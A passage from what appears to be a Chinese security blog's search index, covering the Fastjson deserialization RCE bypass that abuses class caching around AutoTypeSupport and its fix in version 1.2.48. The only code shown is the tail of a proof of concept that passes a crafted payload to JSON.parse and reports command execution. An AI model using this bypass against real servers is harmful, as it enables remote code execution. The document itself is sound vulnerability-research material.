class="hljs-string">&quot;&#125;&quot;</span> +<br>            <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        <span class="hljs-comment">// 模拟受害的fastjson服务器</span><br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>调试 看一下调用栈</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250323124048401.png" alt="image-20250323124048401"></p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250323124459725.png" alt="image-20250323124459725"></p><p>成功执行命令</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250323125747444.png" alt="image-20250323125747444"></p><blockquote><p>你是不仍有疑问，为什么我把 AutoTypeSupport 关了，在 json 串里也用到了@type 字段，为什么还能进行封装呢？</p><p>其实 autoTypeSupport 只是一个布尔值，在 checkAutoType() 函数中仅仅时进行了一些列 if 判断，他并不是把fastjson的@type特性给移除掉了。而我们 既没有在 autoTypeSupport 为true的方法里执行，也没有在autoTypeSupport 为false的方法里执行，所以可以实现RCE绕过</p></blockquote><h3 id="1-2-48"><a href="#1-2-48" class="headerlink" title="1.2.48"></a>1.2.48</h3><p>官方在 1.2.48 对漏洞进行了修复，在 <code>MiscCodec</code> 处理 Class 类的地方，设置了cache 为 false ，并且 <code>loadClass</code> 重载方法的默认的调用改为不缓存，这就避免了使用了 Class 提前将恶意类名缓存进去。</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250323184839413.png" alt="image-20250323184839413"></p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250323185108496.png" alt="image-20250323185108496"></p><p>这也确实把我们想通过缓存的路给封死了</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>fastjson从1.2.24开始爆出RCE后就一发不可收拾，各种绕过接踵而至。作者也是在缝缝补补，不过靠黑名单机制肯定是不足够安全的，会有研究人员不断找出新的路径来实现bypass。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://goodapple.top/archives/832">Java 安全学习——Fastjson 反序列化漏洞 - 枫 のBlog</a></p><p><a href="https://www.javasec.org/java-vuls/FastJson.html">Fastjson 反序列化漏洞 · 攻击 Java Web 应用-Java Web 安全</a></p><p><a href="https://tttang.com/archive/1579/">Fastjson 反序列化分析 - 跳跳糖</a></p><p><a href="https://dililearngent.github.io/2023/02/10/fastjson-security/">Java 安全之 FastJson 漏洞分析与利用 | DiliLearngent’s Blog</a></p>]]></content>
    
    
    <categories>
      
      <category>java安全</category>
      
      <category>fastjson反序列化</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java安全</tag>
      
      <tag>fastjson反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
